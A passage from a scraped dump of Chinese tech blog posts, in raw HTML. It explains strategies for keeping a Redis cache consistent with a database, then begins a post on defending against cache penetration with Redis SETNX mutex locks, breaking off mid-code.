id=\"先更新数据库再更新缓存\">(1)先更新数据库，再更新缓存</h3>\n<p>这套方案，大家是普遍反对的。为什么呢？有如下两点原因。<br>\n<strong>原因一（线程安全角度）</strong><br>\n同时有请求A和请求B进行更新操作，那么会出现<br>\n（1）线程A更新了数据库<br>\n（2）线程B更新了数据库<br>\n（3）线程B更新了缓存<br>\n（4）线程A更新了缓存<br>\n这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。<br>\n<strong>原因二（业务场景角度）</strong><br>\n有如下两点：<br>\n（1）如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。<br>\n（2）如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。</p>\n<p>接下来讨论的就是争议最大的，先删缓存，再更新数据库。还是先更新数据库，再删缓存的问题。</p>\n<h3 id=\"先删缓存再更新数据库\">(2)先删缓存，再更新数据库</h3>\n<p>该方案会导致不一致的原因是。同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:<br>\n（1）请求A进行写操作，删除缓存<br>\n（2）请求B查询发现缓存不存在<br>\n（3）请求B去数据库查询得到旧值<br>\n（4）请求B将旧值写入缓存<br>\n（5）请求A将新值写入数据库<br>\n上述情况就会导致不一致的情形出现。而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。<br>\n那么，<strong>如何解决呢？采用延时双删策略</strong><br>\n伪代码如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe1c5704960870687\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic void write(String key,Object data){\r\n        redis.delKey(key);\r\n        db.updateData(data);\r\n        Thread.sleep(1000);\r\n        redis.delKey(key);\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe1c5704960870687-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1c5704960870687-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1c5704960870687-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1c5704960870687-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe1c5704960870687-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe1c5704960870687-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe1c5704960870687-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">write</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">Object</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1c5704960870687-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1c5704960870687-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">updateData</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1c5704960870687-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">Thread</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe1c5704960870687-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">delKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe1c5704960870687-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n\n</div>\n<p>转化为中文描述就是<br>\n（1）先淘汰缓存<br>\n（2）再写数据库（这两步和原来一样）<br>\n（3）休眠1秒，再次淘汰缓存<br>\n这么做，可以将1秒内所造成的缓存脏数据，再次删除。<br>\n<strong>那么，这个1秒怎么确定的，具体该休眠多久呢？</strong><br>\n针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。<br>\n<strong>如果你用了mysql的读写分离架构怎么办？</strong><br>\nok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。<br>\n（1）请求A进行写操作，删除缓存<br>\n（2）请求A将数据写入数据库了，<br>\n（3）请求B查询缓存发现，缓存没有值<br>\n（4）请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值<br>\n（5）请求B将旧值写入缓存<br>\n（6）数据库完成主从同步，从库变为新值<br>\n上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。<br>\n<strong>采用这种同步淘汰策略，吞吐量降低怎么办？</strong><br>\nok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。<br>\n<strong>第二次删除,如果删除失败怎么办？</strong><br>\n这是个非常好的问题，因为第二次删除失败，就会出现如下情形。还是有两个请求，一个请求A进行更新操作，另一个请求B进行查询操作，为了方便，假设是单库：<br>\n（1）请求A进行写操作，删除缓存<br>\n（2）请求B查询发现缓存不存在<br>\n（3）请求B去数据库查询得到旧值<br>\n（4）请求B将旧值写入缓存<br>\n（5）请求A将新值写入数据库<br>\n（6）请求A试图去删除请求B写入对缓存值，结果失败了。<br>\nok,这也就是说。如果第二次删除缓存失败，会再次出现缓存和数据库不一致的问题。<br>\n<strong>如何解决呢？</strong><br>\n具体解决方案，且看博主对第(3)种更新策略的解析。</p>\n<h3 id=\"先更新数据库再删缓存\">(3)先更新数据库，再删缓存</h3>\n<p>首先，先说一下。老外提出了一个缓存更新套路，名为<a href=\"https://docs.microsoft.com/en-us/azure/architecture/patterns/cache-aside\">《Cache-Aside pattern》</a>。其中就指出</p>\n<ul>\n<li><strong>失效</strong>：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。</li>\n<li><strong>命中</strong>：应用程序从cache中取数据，取到后返回。</li>\n<li><strong>更新</strong>：先把数据存到数据库中，成功后，再让缓存失效。</li>\n</ul>\n<p>另外，知名社交网站facebook也在论文<a href=\"https://www.usenix.org/system/files/conference/nsdi13/nsdi13-final170_update.pdf\">《Scaling Memcache at Facebook》</a>中提出，他们用的也是先更新数据库，再删缓存的策略。<br>\n<strong>这种情况不存在并发问题么？</strong><br>\n不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生<br>\n（1）缓存刚好失效<br>\n（2）请求A查询数据库，得一个旧值<br>\n（3）请求B将新值写入数据库<br>\n（4）请求B删除缓存<br>\n（5）请求A将查到的旧值写入缓存<br>\nok，如果发生上述情况，确实是会发生脏数据。<br>\n<strong>然而，发生这种情况的概率又有多少呢？</strong><br>\n发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。<br>\n假设，有人非要抬杠，有强迫症，一定要解决怎么办？<br>\n<strong>如何解决上述并发问题？</strong><br>\n首先，给缓存设有效时间是一种方案。其次，采用策略（2）里给出的异步延时删除策略，保证读请求完成以后，再进行删除操作。<br>\n<strong>还有其他造成不一致的原因么？</strong><br>\n有的，这也是缓存更新策略（2）和缓存更新策略（3）都存在的一个问题，如果删缓存失败了怎么办，那不是会有不一致的情况出现么。比如一个写数据请求，然后写入数据库了，删缓存失败了，这会就出现不一致的情况了。这也是缓存更新策略（2）里留下的最后一个疑问。<br>\n<strong>如何解决？</strong><br>\n提供一个保障的重试机制即可，这里给出两套方案。<br>\n<strong>方案一</strong>：<br>\n如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/e74363356412a2063817224f814e7972.png\" alt=\"image\"><br>\n流程如下所示<br>\n（1）更新数据库数据；<br>\n（2）缓存因为种种问题删除失败<br>\n（3）将需要删除的key发送至消息队列<br>\n（4）自己消费消息，获得需要删除的key<br>\n（5）继续重试删除操作，直到成功<br>\n然而，该方案有一个缺点，对业务线代码造成大量的侵入。于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作。<br>\n<strong>方案二</strong>：<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/771c3424c83f1059ce967f769dea20ae.png\" alt=\"image\"><br>\n流程如下图所示：<br>\n（1）更新数据库数据<br>\n（2）数据库会将操作信息写入binlog日志当中<br>\n（3）订阅程序提取出所需要的数据以及key<br>\n（4）另起一段非业务代码，获得该信息<br>\n（5）尝试删除缓存操作，发现删除失败<br>\n（6）将这些信息发送至消息队列<br>\n（7）重新从消息队列中获得该数据，重试操作。</p>\n<p><strong>备注说明：</strong>上述的订阅binlog程序在mysql中有现成的中间件叫canal，可以完成订阅binlog日志的功能。至于oracle中，博主目前不知道有没有现成中间件可以使用。另外，重试机制，博主是采用的是消息队列的方式。如果对一致性要求不是很高，直接在程序中另起一个线程，每隔一段时间去重试即可，这些大家可以灵活自由发挥，只是提供一个思路。</p>\n<h2 id=\"总结\">总结</h2>\n<p>本文其实是对目前互联网中已有的一致性方案，进行了一个总结。对于先删缓存，再更新数据库的更新策略，还有方案提出维护一个内存队列的方式，博主看了一下，觉得实现异常复杂，没有必要，因此没有必要在文中给出。最后，希望大家有所收获。</p>\n<h2 id=\"参考文献\">参考文献</h2>\n<p>1、<a href=\"https://mp.weixin.qq.com/s?__biz=MjM5ODYxMDA5OQ==&amp;mid=404308725&amp;idx=1&amp;sn=1a25ce76dd1956014ceb8a011855268e&amp;scene=21#wechat_redirect\">主从DB与cache一致性</a><br>\n2、<a href=\"https://coolshell.cn/articles/17416.html\">缓存更新的套路</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113992\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113992votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113992\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/117976068e2e847f1067d25ea3fa90a3b5a60f3f.jpg"},{"url_object_id": "06b67f2d6e9b1c6772e9dc3273786a32", "title": ["分布式之缓存击穿"], "url": "http://blog.jobbole.com/114012/", "create_date": "2018/05/19", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "praise_nums": "2", "comment_nums": 0, "fav_nums": 4, "tags": "IT技术, 分布式, 数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/rjzheng/p/8908073.html\">孤独烟</a>   </div><h2 id=\"什么是缓存击穿\">什么是缓存击穿</h2>\n<p>在谈论缓存击穿之前，我们先来回忆下从缓存中加载数据的逻辑，如下图所示<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/927e850b8c5ae23d93f46b212108ca38.png\" alt=\"image\"></p>\n<p>因此，如果黑客每次故意查询一个在缓存内必然不存在的数据，导致每次请求都要去存储层去查询，这样缓存就失去了意义。如果在大流量下数据库可能挂掉。这就是缓存击穿。<br>\n场景如下图所示:<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/416c99b6f355c9d20931df6027f4a21c.png\" alt=\"image\"></p>\n<p>我们正常人在登录首页的时候，都是根据userID来命中数据，然而黑客的目的是破坏你的系统，黑客可以随机生成一堆userID,然后将这些请求怼到你的服务器上，这些请求在缓存中不存在，就会穿过缓存，直接怼到数据库上,从而造成数据库连接异常。</p>\n<h2 id=\"解决方案\">解决方案</h2>\n<p>在这里我们给出三套解决方案，大家根据项目中的实际情况，选择使用.</p>\n<p>讲下述三种方案前，我们先回忆下redis的setnx方法</p>\n<p><strong>SETNX</strong> <strong>key</strong> <strong>value</strong></p>\n<p>将 key 的值设为 value ，当且仅当 key 不存在。</p>\n<p>若给定的 key 已经存在，则 SETNX 不做任何动作。</p>\n<p>SETNX 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p>\n<p><strong>可用版本</strong>：&gt;= 1.0.0</p>\n<p><strong>时间复杂度：</strong> O(1)</p>\n<p><strong>返回值：</strong> 设置成功，返回 1。设置失败，返回 0 。</p>\n<p>效果如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195af0479706649\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nredis&gt; EXISTS job                # job 不存在\r\n(integer) 0\r\n\r\nredis&gt; SETNX job \"programmer\"    # job 设置成功\r\n(integer) 1\r\n\r\nredis&gt; SETNX job \"code-farmer\"   # 尝试覆盖 job ，失败\r\n(integer) 0\r\n\r\nredis&gt; GET job                   # 没有被覆盖\r\n\"programmer\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af0479706649-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af0479706649-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af0479706649-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af0479706649-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af0479706649-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af0479706649-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af0479706649-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af0479706649-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af0479706649-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af0479706649-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af0479706649-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195af0479706649-1\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">EXISTS </span><span class=\"crayon-v\">job</span><span class=\"crayon-h\">                </span><span class=\"crayon-p\"># job 不存在</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af0479706649-2\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af0479706649-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af0479706649-4\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SETNX </span><span class=\"crayon-i\">job</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"programmer\"</span><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># job 设置成功</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af0479706649-5\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af0479706649-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe195af0479706649-7\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SETNX </span><span class=\"crayon-i\">job</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"code-farmer\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-p\"># 尝试覆盖 job ，失败</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af0479706649-8\"><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">integer</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af0479706649-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af0479706649-10\"><span class=\"crayon-v\">redis</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GET </span><span class=\"crayon-v\">job</span><span class=\"crayon-h\">                   </span><span class=\"crayon-p\"># 没有被覆盖</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af0479706649-11\"><span class=\"crayon-s\">\"programmer\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h3 id=\"使用互斥锁\">1、使用互斥锁</h3>\n<p>该方法是比较普遍的做法，即，在根据key获得的value值为空时，先锁上，再从数据库加载，加载完毕，释放锁。若其他线程发现获取锁失败，则睡眠50ms后重试。</p>\n<p>至于锁的类型，单机环境用并发包的Lock类型就行，集群环境则使用分布式锁( redis的setnx)</p>\n<p>集群环境的redis的代码如下所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195af9840116321\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nString get(String key) {  \r\n   String value = redis.get(key);  \r\n   if (value  == null) {  \r\n    if (redis.setnx(key_mutex, \"1\")) {  \r\n        // 3 min timeout to avoid mutex holder crash  \r\n        redis.expire(key_mutex, 3 * 60)  \r\n        value = db.get(key);  \r\n        redis.set(key, value);  \r\n        redis.delete(key_mutex);  \r\n    } else {  \r\n        //其他线程休息50毫秒后重试  \r\n        Thread.sleep(50);  \r\n        get(key);  \r\n    }  \r\n  }  \r\n}  </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195af9840116321-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195af9840116321-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-1\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195af9840116321-2\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195af9840116321-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">value</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" 